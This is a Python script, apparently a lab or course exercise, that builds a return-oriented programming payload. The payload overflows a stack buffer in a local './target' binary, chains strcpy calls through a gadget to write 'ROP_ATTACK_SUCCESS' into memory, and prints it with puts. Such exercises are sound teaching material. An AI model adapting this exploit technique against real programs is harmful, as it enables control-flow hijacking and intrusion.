from util import *
import string

TARGET = './target'
TARGET_STRING = 'ROP_ATTACK_SUCCESS\x00'
G_BUF = 0x804aaaa
ADDR_BUF = 0xbffff630
ADDR_RET_ADDR = 0xbffff65c

def get_payload():
	strcpy_plt = plt(TARGET, 'strcpy')
	ppr = ropper_gadget_addr(TARGET, 'pop edi; pop ebp; ret;')
	puts = plt(TARGET,'puts')
	
	alphabet = string.uppercase + "_"
	# ropper cannot run string with null
	alphabet_addr = ropper_str_addr(TARGET, alphabet)
	alphabet += "\x00"
	
	payload = 'A' * (ADDR_RET_ADDR - ADDR_BUF)
	for i  in xrange(len(TARGET_STRING)):
		payload += p32(strcpy_plt) \
			+ p32(ppr) \
			+ p32(G_BUF + i) \
			+ p32(alphabet_addr + alphabet.index(TARGET_STRING[i]))
	payload += p32(puts)
	payload += "AAAA"
	payload += p32(G_BUF)
	return payload

if __name__ == '__main__':
	cmd = ['python', 'target.py']
	p = sp.Popen(cmd, stdin = sp.PIPE)
	p.stdin.write(get_payload() + "\n")
